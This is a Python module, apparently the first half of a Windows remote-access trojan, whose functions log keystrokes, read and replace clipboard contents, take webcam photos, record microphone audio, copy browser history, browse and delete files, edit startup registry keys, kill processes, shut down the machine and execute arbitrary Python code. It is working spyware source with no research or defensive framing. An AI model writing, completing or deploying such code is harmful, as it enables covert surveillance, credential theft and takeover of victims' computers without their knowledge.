# advanced_features.py - TO'LIQ VERSIYA (PART 1/2)
import os
import sys
import subprocess
import json
import logging
import shutil
import winreg
import time
import platform
from pathlib import Path
from datetime import datetime
import sqlite3
import zipfile

try:
    import psutil
except ImportError:
    psutil = None

logger = logging.getLogger(__name__)

# ==================== 1. KEYLOGGER ====================
class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.running = False
        
    def start(self):
        try:
            import pynput.keyboard as keyboard
            
            def on_press(key):
                try:
                    with open(self.log_file, "a", encoding='utf-8') as f:
                        if hasattr(key, 'char'):
                            f.write(key.char)
                        else:
                            f.write(f" [{key}] ")
                except:
                    pass
            
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            self.running = True
            return True
        except ImportError:
            logger.error("pynput not installed")
            return False
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
            return False
    
    def stop(self):
        try:
            if self.running:
                self.listener.stop()
                self.running = False
            return True
        except:
            return False
    
    def get_logs(self):
        try:
            if os.path.exists(self.log_file):
                with open(self.log_file, "r", encoding='utf-8') as f:
                    return f.read()
            return "Log bosh"
        except:
            return "Xatolik"

# ==================== 2. CLIPBOARD ====================
def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except ImportError:
        try:
            import pyperclip
            return pyperclip.paste()
        except:
            return "Clipboard library yoq"
    except:
        return "Clipboard bosh"

def set_clipboard(text):
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardText(text)
        win32clipboard.CloseClipboard()
        return True
    except ImportError:
        try:
            import pyperclip
            pyperclip.copy(text)
            return True
        except:
            return False
    except:
        return False

# ==================== 3. WEBCAM ====================
def take_webcam_photo(save_path="webcam.jpg"):
    try:
        import cv2
        
        cap = cv2.VideoCapture(0)
        time.sleep(2)
        
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(save_path, frame)
            cap.release()
            return save_path
        
        cap.release()
        return None
    except ImportError:
        logger.error("opencv-python not installed")
        return None
    except Exception as e:
        logger.error(f"Webcam error: {e}")
        return None

# ==================== 4. AUDIO ====================
def record_audio(duration=10, save_path="audio.wav"):
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        write(save_path, fs, recording)
        return save_path
    except ImportError:
        logger.error("sounddevice/scipy not installed")
        return None
    except Exception as e:
        logger.error(f"Audio error: {e}")
        return None

# ==================== 5. PROCESS MANAGER ====================
def get_running_processes():
    try:
        if not psutil:
            return []
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent']):
            try:
                processes.append({
                    'pid': proc.info['pid'],
                    'name': proc.info['name'],
                    'user': proc.info['username'],
                    'memory': f"{proc.info['memory_percent']:.1f}%",
                    'cpu': f"{proc.info['cpu_percent']:.1f}%"
                })
            except:
                continue
        return processes
    except Exception as e:
        logger.error(f"Process list error: {e}")
        return []

def kill_process(pid_or_name):
    try:
        if not psutil:
            return False
        if isinstance(pid_or_name, int):
            proc = psutil.Process(pid_or_name)
            proc.kill()
        else:
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() == pid_or_name.lower():
                    proc.kill()
        return True
    except Exception as e:
        logger.error(f"Kill process error: {e}")
        return False

# ==================== 6. SYSTEM INFO ====================
def get_system_info():
    try:
        info = {
            'os': platform.system(),
            'os_version': platform.version(),
            'os_release': platform.release(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'python_version': platform.python_version(),
        }
        
        if psutil:
            info['cpu_count'] = psutil.cpu_count(logical=False)
            info['cpu_cores'] = psutil.cpu_count(logical=True)
            info['cpu_freq'] = f"{psutil.cpu_freq().current:.0f} MHz"
            
            ram = psutil.virtual_memory()
            info['ram_total'] = f"{ram.total / (1024**3):.1f} GB"
            info['ram_used'] = f"{ram.used / (1024**3):.1f} GB"
            info['ram_percent'] = f"{ram.percent}%"
            
            disk = psutil.disk_usage('C:')
            info['disk_total'] = f"{disk.total / (1024**3):.1f} GB"
            info['disk_used'] = f"{disk.used / (1024**3):.1f} GB"
            info['disk_free'] = f"{disk.free / (1024**3):.1f} GB"
            info['disk_percent'] = f"{disk.percent}%"
            
            battery = psutil.sensors_battery()
            if battery:
                info['battery_percent'] = f"{battery.percent}%"
                info['battery_plugged'] = battery.power_plugged
        
        return info
    except Exception as e:
        logger.error(f"System info error: {e}")
        return {}

# ==================== 7. FILE EXPLORER ====================
def list_files(path="C:/", pattern="*"):
    try:
        p = Path(path)
        files = []
        for item in p.glob(pattern):
            try:
                stat = item.stat()
                files.append({
                    'name': item.name,
                    'path': str(item),
                    'type': 'dir' if item.is_dir() else 'file',
                    'size': stat.st_size,
                    'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                })
            except:
                continue
        return files
    except Exception as e:
        logger.error(f"List files error: {e}")
        return []

def download_file(file_path):
    try:
        path = Path(file_path)
        if path.exists() and path.is_file():
            return str(path)
        return None
    except:
        return None

def delete_file(file_path):
    try:
        path = Path(file_path)
        if path.exists():
            if path.is_file():
                path.unlink()
            elif path.is_dir():
                shutil.rmtree(path)
            return True
        return False
    except Exception as e:
        logger.error(f"Delete file error: {e}")
        return False

# ==================== 8. STARTUP MANAGER ====================
def list_startup_programs():
    try:
        startups = []
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_READ
            )
            
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    startups.append({'name': name, 'path': value, 'type': 'HKCU'})
                    i += 1
                except OSError:
                    break
            
            winreg.CloseKey(key)
        except:
            pass
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_READ
            )
            
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    startups.append({'name': name, 'path': value, 'type': 'HKLM'})
                    i += 1
                except OSError:
                    break
            
            winreg.CloseKey(key)
        except:
            pass
        
        return startups
    except Exception as e:
        logger.error(f"Startup list error: {e}")
        return []

def remove_startup_program(name):
    try:
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_WRITE
            )
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            return True
        except:
            pass
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_WRITE
            )
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            return True
        except:
            pass
        
        return False
    except Exception as e:
        logger.error(f"Remove startup error: {e}")
        return False

# ==================== 9. INSTALLED PROGRAMS ====================
def list_installed_programs():
    try:
        programs = []
        reg_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        
        for reg_path in reg_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                
                for i in range(winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        
                        try:
                            name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            version = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                            publisher = winreg.QueryValueEx(subkey, "Publisher")[0]
                            
                            programs.append({
                                'name': name,
                                'version': version,
                                'publisher': publisher
                            })
                        except:
                            pass
                        
                        winreg.CloseKey(subkey)
                    except:
                        continue
                
                winreg.CloseKey(key)
            except:
                continue
        
        return programs
    except Exception as e:
        logger.error(f"Installed programs error: {e}")
        return []

# ==================== 10. NETWORK ====================
def get_network_connections():
    try:
        if not psutil:
            return []
        connections = []
        for conn in psutil.net_connections(kind='inet'):
            try:
                connections.append({
                    'local': f"{conn.laddr.ip}:{conn.laddr.port}",
                    'remote': f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A",
                    'status': conn.status,
                    'pid': conn.pid
                })
            except:
                continue
        return connections
    except Exception as e:
        logger.error(f"Network connections error: {e}")
        return []

# ==================== 11. BROWSER HISTORY ====================
def get_browser_history(browser='chrome', limit=100):
    try:
        if browser.lower() == 'chrome':
            history_path = Path.home() / "AppData/Local/Google/Chrome/User Data/Default/History"
        elif browser.lower() == 'edge':
            history_path = Path.home() / "AppData/Local/Microsoft/Edge/User Data/Default/History"
        elif browser.lower() == 'firefox':
            profile_path = Path.home() / "AppData/Roaming/Mozilla/Firefox/Profiles"
            try:
                profile = list(profile_path.glob("*.default*"))[0]
                history_path = profile / "places.sqlite"
            except:
                return []
        else:
            return []
        
        if not history_path.exists():
            return []
        
        temp_db = Path(os.environ.get("TEMP", "")) / f"history_{int(time.time())}.db"
        shutil.copyfile(history_path, temp_db)
        
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        
        if browser.lower() in ['chrome', 'edge']:
            cursor.execute(f"SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {limit}")
        else:
            cursor.execute(f"SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT {limit}")
        
        history = []
        for row in cursor.fetchall():
            history.append({
                'url': row[0],
                'title': row[1] or "No title",
                'visits': row[2]
            })
        
        conn.close()
        temp_db.unlink(missing_ok=True)
        
        return history
    except Exception as e:
        logger.error(f"Browser history error: {e}")
        return []

# ==================== 12. SHUTDOWN/RESTART ====================
def shutdown_system(delay=0):
    try:
        subprocess.run(f"shutdown /s /t {delay}", shell=True)
        return True
    except:
        return False

def restart_system(delay=0):
    try:
        subprocess.run(f"shutdown /r /t {delay}", shell=True)
        return True
    except:
        return False

def cancel_shutdown():
    try:
        subprocess.run("shutdown /a", shell=True)
        return True
    except:
        return False

# ==================== 13. LOCK SCREEN ====================
def lock_screen():
    try:
        import ctypes
        ctypes.windll.user32.LockWorkStation()
        return True
    except:
        return False

# ==================== 14. DISK USAGE ====================
def get_disk_usage_all():
    try:
        if not psutil:
            return []
        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    'device': partition.device,
                    'mountpoint': partition.mountpoint,
                    'fstype': partition.fstype,
                    'total': f"{usage.total / (1024**3):.1f} GB",
                    'used': f"{usage.used / (1024**3):.1f} GB",
                    'free': f"{usage.free / (1024**3):.1f} GB",
                    'percent': f"{usage.percent}%"
                })
            except:
                continue
        return disks
    except Exception as e:
        logger.error(f"Disk usage error: {e}")
        return []

# ==================== 15. PYTHON CODE ====================
def execute_python_code(code):
    try:
        import io
        from contextlib import redirect_stdout
        
        output = io.StringIO()
        with redirect_stdout(output):
            exec(code)
        
        return output.getvalue()
    except Exception as e:
        return f"Error: {str(e)}"

# ==================== 16. ZIP FILES ====================
def create_zip(source_path, zip_name):
    try:
        source = Path(source_path)
        
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            if source.is_file():
                zipf.write(source, source.name)
            elif source.is_dir():
                for root, dirs, files in os.walk(source):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, source))
        
        return zip_name
    except Exception as e:
        logger.error(f"Zip error: {e}")
        return None